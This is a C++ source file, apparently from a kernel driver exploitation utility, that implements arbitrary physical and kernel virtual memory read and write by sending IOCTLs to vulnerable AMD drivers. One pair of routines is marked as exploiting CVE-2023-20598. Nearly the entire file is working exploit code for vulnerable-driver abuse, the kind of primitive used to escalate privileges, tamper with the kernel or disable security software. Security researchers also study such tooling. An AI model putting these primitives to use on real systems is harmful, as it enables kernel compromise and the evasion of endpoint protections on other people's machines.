/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2026
*
*  TITLE:       AMD.CPP
*
*  VERSION:     1.49
*
*  DATE:        04 Jun 2026
*
*  AMD drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/amd.h"

/*
* RmValidatePrerequisites
*
* Purpose:
*
* Check if the current CPU vendor is AMD.
* This driver won't work on anything else as it has hard block on driver entry.
*
*/
BOOL RmValidatePrerequisites(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bResult;
    UNREFERENCED_PARAMETER(Context);

    bResult = supIsSupportedCpuVendor(CPU_VENDOR_AMD, CPU_VENDOR_AMD_LENGTH);

    if (!bResult)
        supPrintfEvent(kduEventError, "[!] Abort, AMD CPU is required.\r\n");

    return bResult;
}

/*
* RmReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI RmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;
    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_READ_MEMORY,
            pRequest,
            sizeof(RMDRV_REQUEST),
            pRequest,
            (ULONG)size);

        if (bResult) {

            RtlCopyMemory(
                Buffer,
                RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
                NumberOfBytes);

        }

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* RmWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI RmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;

    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        RtlCopyMemory(
            RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
            Buffer,
            NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* PdFwReadVirtualMemory
*
* Purpose:
*
* Read virtual memory.
* CVE-2023-20598
*
*/
BOOL WINAPI PdFwReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;
    request.Source = (PVOID)Address;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* PdFwWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory.
* CVE-2023-20598
* 
*/
BOOL WINAPI PdFwWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;
    request.Source = Buffer;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* AffVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI AffVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
}

/*
* AffReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AffReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PAFFDRV_READ_REQUEST pRequest;
    PAFFDRV_READ_REPLY pReply;
    PUCHAR ptr;
    ULONG bytesDone, bytesRead;
    SIZE_T requestSize, replySize;

    pRequest = NULL;
    pReply = NULL;
    ptr = (PUCHAR)Buffer;
    bytesDone = 0;
    requestSize = sizeof(AFFDRV_READ_REQUEST);
    replySize = sizeof(AFFDRV_READ_REPLY);

    if (Buffer == NULL || NumberOfBytes == 0)
        return FALSE;

    pRequest = (PAFFDRV_READ_REQUEST)supAllocateLockedMemory(requestSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest == NULL)
        return FALSE;

    pReply = (PAFFDRV_READ_REPLY)supAllocateLockedMemory(replySize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pReply == NULL) {
        supFreeLockedMemory(pRequest, requestSize);
        return FALSE;
    }

    bResult = TRUE;

    do {

        bytesRead = NumberOfBytes - bytesDone;
        if (bytesRead > PAGE_SIZE)
            bytesRead = PAGE_SIZE;

        RtlSecureZeroMemory(pRequest, requestSize);
        RtlSecureZeroMemory(pReply, replySize);

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress + bytesDone;
        pRequest->Size = bytesRead;

        if (!supCallDriver(DeviceHandle,
            IOCTL_AMDAFF_READ_MEMORY,
            pRequest,
            (ULONG)requestSize,
            pReply,
            (ULONG)replySize))
        {
            bResult = FALSE;
            break;
        }

        RtlCopyMemory(
            ptr + bytesDone,
            pReply->Data,
            bytesRead);

        bytesDone += bytesRead;

    } while (bytesDone < NumberOfBytes);

    supFreeLockedMemory(pReply, replySize);
    supFreeLockedMemory(pRequest, requestSize);

    return bResult;
}

/*
* AffWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AffWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    PAFFDRV_WRITE_REQUEST pRequest;
    SIZE_T size;

    pRequest = NULL;
    size = sizeof(AFFDRV_WRITE_REQUEST);

    if (Buffer == NULL || NumberOfBytes == 0)
        return FALSE;

    pRequest = (PAFFDRV_WRITE_REQUEST)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        RtlSecureZeroMemory(pRequest, size);

        pRequest->Size = NumberOfBytes;
        pRequest->InputBuffer = Buffer;
        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDAFF_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            pRequest,
            (ULONG)size);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* AffWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI AffWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        AffWritePhysicalMemory);
}

/*
* AffReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI AffReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        AffReadPhysicalMemory);
}
